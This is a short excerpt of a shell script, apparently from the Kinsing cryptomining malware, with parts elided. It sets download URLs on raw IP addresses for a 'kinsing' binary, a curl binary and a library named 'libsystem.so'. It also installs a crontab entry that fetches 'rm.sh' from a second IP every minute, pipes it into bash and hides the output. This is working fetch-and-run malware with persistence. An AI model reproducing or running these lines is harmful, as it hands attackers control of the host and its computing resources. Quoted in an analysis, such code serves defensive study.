...
BIN_DOWNLOAD_URL="http://185.17.0.226/kinsing"
BIN_DOWNLOAD_URL2="http://185.17.0.226/kinsing"
CURL_DOWNLOAD_URL="http://185.17.0.226/curl-amd64"

SO_FULL_PATH="$BIN_PATH/$SO_NAME"
SO_DOWNLOAD_URL="http://185.17.0.226/libsystem.so"
SO_DOWNLOAD_URL2="http://185.17.0.226/libsystem.so"
...
if [ $? -eq 0 ]; then
  ...
  (
    ...
    echo "* * * * * $LDR http://185.122.204.197/rm.sh | bash > /dev/null 2>&1"
  ) | crontab -
fi
